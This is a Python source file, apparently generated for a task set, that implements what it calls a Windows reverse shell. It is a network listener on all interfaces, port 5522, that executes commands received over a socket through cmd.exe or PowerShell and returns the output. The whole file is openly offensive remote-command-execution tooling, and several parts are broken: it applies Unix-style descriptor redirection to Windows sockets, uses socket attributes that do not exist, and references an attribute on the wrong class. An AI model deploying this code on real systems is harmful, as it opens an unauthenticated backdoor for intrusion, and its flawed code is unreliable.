from TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import subprocess
import os


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell to execute remote commands."""

    def __init__(self, config: ReverseShellConfig) -> None:
        self.config = config
        self.server_socket: socket.socket | None = None
        self.client_socket: socket.socket | None = None
        self.process: subprocess.Popen[bytes] | None = None

    def _spawn_shell(self, shell_type: str) -> subprocess.Popen[bytes]:
        """Spawn a Windows shell process with proper file descriptor redirection.

        Args:
            shell_type: The type of shell to spawn ('cmd.exe' or 'powershell.exe').

        Returns:
            A Popen object representing the spawned shell process.
        """
        if shell_type == 'cmd.exe':
            cmd = ['cmd.exe', '/c']
        elif shell_type == 'powershell.exe':
            cmd = ['powershell.exe', '-Command', 'Start-Process -Wait -NoNewWindow']
        else:
            raise ValueError(f"Unknown shell type: {shell_type}")

        self.process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
            shell=True,
        )

        # Redirect file descriptors through the socket connection
        if self.client_socket:
            os.dup2(self.client_socket.fileno(), 0)   # stdin
            os.dup2(self.client_socket.fileno(), 1)   # stdout
            os.dup2(self.client_socket.fileno(), 2)   # stderr

        return self.process

    def _handle_client(self, client_socket: socket.socket) -> ExecutionResult:
        """Handle a single reverse shell connection.

        Args:
            client_socket: The connected client socket.

        Returns:
            An ExecutionResult containing the command output and exit code.
        """
        try:
            self.client_socket = client_socket
            shell_type = self.config.shell_type.lower()

            if shell_type not in ('cmd.exe', 'powershell.exe'):
                raise ValueError(f"Unsupported shell type: {shell_type}")

            process = self._spawn_shell(shell_type)

            # Read command from socket
            buffer = b''
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                buffer += chunk

            try:
                decoded_command = buffer.decode('utf-8', errors='replace').strip()
            except Exception as e:
                return ExecutionResult(
                    command_output=f"Decode error: {e}",
                    exit_code=1,
                    error_messages=[f"Failed to decode command: {e}"],
                )

            if not decoded_command:
                return ExecutionResult(
                    command_output="",
                    exit_code=0,
                    error_messages=[],
                )

            # Execute the command via the spawned shell
            result = subprocess.run(
                [shell_type] + decoded_command.split(),
                capture_output=True,
                text=True,
                timeout=self.config.timeout,
            )

            output_lines = []
            if result.stdout:
                for line in result.stdout.strip().split('\n'):
                    output_lines.append(line)
            if result.stderr and result.returncode != 0:
                for line in result.stderr.strip().split('\n'):
                    output_lines.append(f"[ERR] {line}")

            return ExecutionResult(
                command_output='\n'.join(output_lines),
                exit_code=result.returncode,
                error_messages=[],
            )

        except subprocess.TimeoutExpired as e:
            if self.process and self.process.poll() is None:
                self.process.kill()
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=[f"Command timed out after {self.config.timeout}s"],
            )

        except subprocess.SubprocessError as e:
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=[str(e)],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=[f"Unexpected error: {e}"],
            )

    def _accept_connection(self) -> ExecutionResult | None:
        """Accept a single client connection and handle it.

        Returns:
            An ExecutionResult if successful, or None on failure.
        """
        try:
            self.client_socket, addr = self.server_socket.accept()
            result = self._handle_client(self.client_socket)
            return result
        except socket.timeout:
            return None
        except OSError as e:
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=[f"Accept error: {e}"],
            )

    def start(self) -> ExecutionResult | None:
        """Start the reverse shell listener.

        Returns:
            An ExecutionResult with any startup errors, or None if started successfully.
        """
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )
            self.server_socket.bind((self.config.host, self.config.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(self.config.timeout)

            return ExecutionResult(
                command_output=f"Listener started on {self.config.host}:{self.config.port}",
                exit_code=0,
                error_messages=[],
            )
        except OSError as e:
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=[f"Failed to bind listener: {e}"],
            )

    def stop(self) -> None:
        """Stop the reverse shell listener."""
        if self.server_socket and not self.server_socket.closed:
            try:
                self.server_socket.close()
            except OSError:
                pass
        if self.process and self.process.poll() is None:
            try:
                self.process.terminate()
            except Exception:
                pass


class WindowsReverseShell:
    """Windows reverse shell that spawns cmd.exe or powershell to execute remote commands.

    This class provides the main interface for creating and managing a Windows
    reverse shell listener that accepts incoming connections and executes
    remote commands through a spawned shell process.
    """

    def __init__(self, config: ReverseShellConfig | None = None) -> None:
        self.config = config or ReverseShellConfig()
        self.listener: WindowsReverseShellListener | None = None
        self.running: bool = False

    @property
    def config(self) -> ReverseShellConfig:
        """Get the configuration."""
        return self._config

    @config.setter
    def config(self, value: ReverseShellConfig) -> None:
        """Set the configuration."""
        self._config = value

    def start(self) -> ExecutionResult | None:
        """Start the reverse shell listener.

        Returns:
            An ExecutionResult indicating success or failure.
        """
        if not self.listener:
            self.listener = WindowsReverseShellListener(self.config)
        result = self.listener.start()
        if result and result.exit_code == 0:
            self.running = True
        return result

    def stop(self) -> None:
        """Stop the reverse shell listener."""
        if self.listener:
            self.listener.stop()
            self.running = False

    def accept_connection(self) -> ExecutionResult | None:
        """Accept and handle a single client connection.

        Returns:
            An ExecutionResult containing the command output and exit code,
            or None on failure.
        """
        if not self.listener:
            return ExecutionResult(
                command_output="",
                exit_code=1,
                error_messages=["No listener started"],
            )
        result = self.listener._accept_connection()
        return result

    def run(self) -> None:
        """Run the reverse shell listener in a loop."""
        if not self.listener:
            self.start()

        while self.running and not self.server_socket.closed:
            try:
                result = self.listener._accept_connection()
                if result is not None:
                    print(f"Command output:\n{result.command_output}")
                    print(f"Exit code: {result.exit_code}")
                    for msg in result.error_messages:
                        print(f"[ERROR] {msg}")
            except KeyboardInterrupt:
                break

    def __enter__(self) -> 'WindowsReverseShell':
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self.stop()


def main() -> None:
    """Main entry point for the Windows reverse shell."""
    config = ReverseShellConfig(
        host='0.0.0.0',
        port=5522,
        timeout=30.0,
        shell_type='cmd.exe',
    )

    shell = WindowsReverseShell(config)
    result = shell.start()

    if result and result.exit_code == 0:
        print("Reverse shell listener started successfully.")
        print(f"Listening on {config.host}:{config.port}")
        print("Press Ctrl+C to stop.\n")

        try:
            while True:
                result = shell.accept_connection()
                if result is not None:
                    print(f"\n{'='*60}")
                    print(f"Command output:\n{result.command_output}")
                    print(f"Exit code: {result.exit_code}")
                    for msg in result.error_messages:
                        print(f"[ERROR] {msg}")
                    print(f"{'='*60}\n")
        except KeyboardInterrupt:
            pass

    shell.stop()


if __name__ == '__main__':
    main()
